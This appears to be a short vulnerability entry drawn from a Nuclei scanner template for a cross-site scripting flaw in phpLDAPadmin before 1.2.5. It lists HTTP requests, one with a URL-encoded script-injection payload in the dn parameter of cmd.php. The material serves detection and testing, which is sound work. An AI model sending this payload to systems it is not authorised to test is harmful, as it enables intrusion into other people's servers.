# Vulnerability: PHP LDAP Admin < 1.2.5 - Cross-Site Scripting
**Classification:** PHP
**Source:** Nuclei Template (`phpldapadmin-xss.yaml`)

## Description
PHP LDAP Admin is vulnerable to XSS.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}
GET {{BaseURL}}{{path}}/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1
GET {{BaseURL}}{{path}}/index.php?redirect=true&meth=ajax
```

